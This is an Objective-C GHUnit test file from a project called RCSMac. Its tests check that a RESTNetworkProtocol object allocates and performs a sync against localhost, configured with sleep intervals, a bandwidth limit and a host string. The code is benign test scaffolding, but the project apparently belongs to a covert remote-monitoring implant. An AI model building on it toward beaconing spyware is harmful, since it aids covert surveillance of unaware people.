//
//  RESTNetworkProtocolTest.m
//  RCSMac
//
//  Created by revenge on 1/19/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Cocoa/Cocoa.h>
#import <GHUnit/GHUnit.h>

#import "RESTNetworkProtocol.h"
#import "RCSMCommon.h"


@interface RESTNetworkProtocolTest : GHTestCase

@end

@implementation RESTNetworkProtocolTest

- (BOOL)shouldRunOnMainThread
{
  // By default NO, but if you have a UI test or test dependent on running on the main thread return YES
  return NO;
}

- (void)setUpClass
{
  // Run at start of all tests in the class
}

- (void)tearDownClass
{
  // Run at end of all tests in the class
}

- (void)setUp
{
  // Run before each test method
}

- (void)tearDown
{
  // Run after each test method
}

- (void)testAllocation
{
  NSMutableData *config   = [[NSMutableData alloc] initWithLength: sizeof(syncStruct)];
  syncStruct *header      = (syncStruct *)[config mutableBytes];
  header->minSleepTime    = 0;
  header->maxSleepTime    = 0;
  header->bandwidthLimit  = 1000;
  char host[]             = "localhost";
  strncpy(header->configString, host, strlen(host));
  
  RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc] initWithConfiguration: config];
  [config release];
  
  // Assert protocol is not NULL, with no custom error description
  GHAssertNotNULL(protocol, nil, @"Error on allocation");
  
  [protocol release];
}

- (void)testInitParameters
{
  NSMutableData *config   = [[NSMutableData alloc] initWithLength: sizeof(syncStruct)];
  syncStruct *header      = (syncStruct *)[config mutableBytes];
  header->minSleepTime    = 0;
  header->maxSleepTime    = 0;
  header->bandwidthLimit  = 1000;
  char host[]             = "";
  strncpy(header->configString, host, strlen(host));
  
  RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc] initWithConfiguration: config];
  [config release];
  
  GHAssertNULL(protocol, @"Allocation should fail with wrong parameters (host)");
  [protocol release];
}

- (void)testPerform
{
  NSMutableData *config   = [[NSMutableData alloc] initWithLength: sizeof(syncStruct)];
  syncStruct *header      = (syncStruct *)[config mutableBytes];
  header->minSleepTime    = 0;
  header->maxSleepTime    = 0;
  header->bandwidthLimit  = 1000;
  char host[]             = "localhost";
  strncpy(header->configString, host, strlen(host));
  
  RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc] initWithConfiguration: config];
  [config release];
  
  GHAssertNotNULL(protocol, @"Allocation failed");
  
  BOOL success = [protocol perform];
  
  GHAssertTrue(success, @"Something went wrong during perform operation");
  
  [protocol release];
}

@end